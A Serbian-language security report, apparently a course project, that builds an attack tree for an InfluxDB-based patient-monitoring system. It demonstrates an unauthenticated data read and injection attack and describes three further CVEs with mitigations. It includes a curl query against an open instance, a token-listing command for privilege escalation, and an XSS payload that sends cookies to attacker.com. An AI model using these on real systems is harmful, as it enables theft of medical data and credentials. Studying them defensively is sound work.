# InfluxDB Izveštaj

Analiziran je sistem za zdravstveni monitoring gde IoT uređaji šalju medicinske podatke pacijenata putem InfluxDB vremenske baze podataka. Kao bezbednosna pretnja identifikovana je kategorija napada koji ciljaju poverljivost (confidentiality) sistema prema CIA trijadi.


## Stablo napada

<img width="5133" height="1052" alt="influxdb-diagram" src="https://github.com/user-attachments/assets/88f9091a-8db1-44e6-bff6-72beec34e986" />

## Praktično realizovan napad

Napad eksploatiše CVE-2019-20933 u InfluxDB verzijama pre 1.7.6 i podrazumevanu konfiguraciju InfluxDB 1.x gde je autentifikacija isključena (`auth-enabled=false`). Sistem koji je implementiran se sastoji iz tri komponente koje su kontejnerizovane i organizovane pomoću docker compose-a. Ovaj napad spada u **CWE-287** (Improper Authentication) i CWE-306 (Missing Authentication for Critical Function) po MITRE terminologiji.

### Video demonstracija

https://github.com/user-attachments/assets/1e4c94a6-2040-4ab7-a550-c4e2e5be82b6

### Implementacija ranjive aplikacije

Ranjiv sistem se sastoji iz InfluxDB 1.8 instance i aplikacije implementirane u Rust programskom jeziku. InfluxDB je pokrenut sa `INFLUXDB_HTTP_AUTH_ENABLED=false` (podrazumevana vrednost) i bez TLS enkripcije. Aplikacija šalje simulirane medicinske podatke pacijenata (puls, krvni pritisak, temperatura, saturacija kiseonikom) bez ikakve autentifikacije.

### Implementacija napada

Napad se izvodi u tri faze:

1. **Enumeracija** - napadač šalje `SHOW DATABASES` upit bez ikakvog tokena ili lozinke i dobija listu svih baza podataka
2. **Ekstrakcija podataka** - napadač izvršava `SELECT * FROM vitals` i čita poverljive medicinske podatke svih pacijenata
3. **Ubacivanje lažnih podataka** - napadač upisuje lažne kritične vrednosti koje se ne mogu razlikovati od legitimnih, što može izazvati pogrešne medicinske odluke

Pored direktnog napada bez autentifikacije, CVE-2019-20933 omogućava i bypass putem JWT tokena sa algoritmom `none` kada napadač kreira JWT token bez poznavanja tajnog ključa jer ranjive verzije ne verifikuju potpis tokena.

### Implementacija mitigovane aplikacije

Mitigovan sistem koristi InfluxDB 2.7 koji obavezno zahteva token autentifikaciju za sve API pozive. JWT `none` algoritam je odbijen na nivou biblioteke. Token se prosleđuje kroz environment varijablu (nije hardkodovan u kodu), a svaki token ima precizno definisan scope (write-only za IoT aplikaciju). Pored toga, napadačev zahtev bez tokena ili sa lažnim JWT tokenom dobija HTTP 401 Unauthorized odgovor.

## Napadi koji nisu realizovani

Preostala tri napada iz stabla nisu implementirana u praktičnom delu, ali su teorijski relevantni za potpunu bezbednosnu analizu sistema.

### 1. Nedostatak autentifikacije po defaultu (CVE-2022-36640)

Ranjivost pogađa InfluxDB verzije pre 1.8.10 i nastaje zbog toga što autentifikacija nije omogućena podrazumevano prilikom instalacije. Ukoliko administrator ne konfiguriše eksplicitno autentifikaciju u konfiguracionom fajlu, InfluxDB instanca je potpuno otvorena i bilo koji klijent koji može da dosegne port 8086 može bez ikakvih kredencijala da čita, upisuje i briše podatke, kao i da izvršava upite. Ovo je naročito opasno u slučaju javno dostupnih endpoint-a ili pogrešno konfigurisanih firewall pravila.

Napad ne zahteva nikakvu posebnu tehniku već je dovoljan standardni HTTP klijent poput curl-a ili Postman-a. Napadač može slati InfluxQL upite direktno na HTTP API bez zaglavlja za autentifikaciju i dobijati pune rezultate. Na primer, upit:
```
curl "http://<target>:8086/query?q=SHOW+DATABASES"
```
vraća listu svih baza podataka bez ikakve autentifikacije. 

Mitigacija za ovaj napad je eksplicitno postavljanje `auth-enabled = true` u InfluxDB konfiguracionom fajlu influxdb.conf, kao i nadogradnja na verziju >= 1.8.10 i primena principa najmanje privilegije pri dodeljivanju korisničkih naloga.


### 2. Privilege Escalation putem operator tokena (CVE-2024-30896)

Ranjivost pogađa InfluxDB OSS verzije 2.x do 2.7.11 i predstavlja grešku u business logici upravljanja tokenima. Tokom inicijalne konfiguracije InfluxDB instance, `operator` token, to jest token sa apsolutno svim administrativnim pravima nad celokupnom instancom, automatski se smešta u podrazumevanu organizaciju. Korisnici koji poseduju `allAccess` token unutar iste organizacije mogu putem komande 
```
influx auth ls
```
ili direktno preko API endpoint-a da izlistaju sve tokene u toj organizaciji, uključujući i `operator` token. Na taj način korisnik sa ograničenim pristupom može da eskalira privilegije na nivo administratora cele instance, kompromitujući podatke svih organizacija. 

Napad se izvodi u nekoliko koraka: 
  - napadač koji poseduje allAccess token pokreće:
    ```
    influx auth ls -t <allAccessToken> | grep "write:/orgs"
    ```
    što filtrira izlaz i prikazuje `operator` token;
  - sa dobijenim tokenom, napadač ima potpunu kontrolu nad instancom i može čitati i menjati podatke u svim organizacijama, kreirati nove tokene i uništavati podatke;

Mitigacija je nadogradnja na verziju >= 2.8.0, rotiranje svih postojećih `operator` tokena i izbegavanje smeštanja `operator` tokena u podrazumevanu organizaciju kojoj imaju pristup ostali korisnici.


### 3. Reflected XSS u admin panelu (CVE-2018-17572)

Ranjivost pogađa InfluxDB verziju 0.9.5 i manifestuje se kao Reflected Cross-Site Scripting u admin web panelu, konkretno u modulu za unos podataka (Write Data). Zbog odsustva validacije i sanitizacije korisničkog unosa, napadač može da konstruiše maliciozni URL koji sadrži JavaScript payload koji se reflektuje i izvršava u browseru žrtve. 

Napad funkcioniše na sledeći način: 
  - napadač kreira URL koji u parametrima sadrži JavaScript kod, na primer:
    ```
    http://<target>:8083/write?query=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
    ```
  - administrator ili drugi autentifikovani korisnik poseti taj URL, na primer putem phishing e-maila;
  - kada žrtva otvori link u browseru, maliciozni skript se izvršava u kontekstu admin panela i može da ukrade session kolačiće, prikaže lažni login formular ili izvrši akcije u ime žrtve.

Iako je InfluxDB 0.9.5 stara verzija, XSS ranjivosti u administrativnim interfejsima ostaju relevantan vektor napada ukoliko se ne vrše redovne nadogradnje. 

Mitigacija za ovaj napad je nadogradnja na noviju verziju InfluxDB-a, implementacija Content Security Policy (CSP) zaglavlja i validacija svih korisničkih unosa na serverskoj strani pre renderovanja.


## Reference:
- https://nvd.nist.gov/vuln/detail/CVE-2022-36640
- https://docs.influxdata.com/influxdb/v1/administration/authentication_and_authorization/
- https://vulert.com/vuln-db/CVE-2022-36640
- https://www.clouddefense.ai/cve/2022/CVE-2022-36640
- https://nvd.nist.gov/vuln/detail/CVE-2024-30896
- https://github.com/XenoM0rph97/CVE-2024-30896
- https://github.com/influxdata/influxdb/issues/24797
- https://osv.dev/vulnerability/CVE-2024-30896
- https://nvd.nist.gov/vuln/detail/CVE-2018-17572
- https://owasp.org/www-community/attacks/xss/
- https://gist.github.com/Raghavrao29/1cb84f1f2d8ce993fd7b2d1366d35f48
- https://secalerts.co/vulnerability/CVE-2018-17572
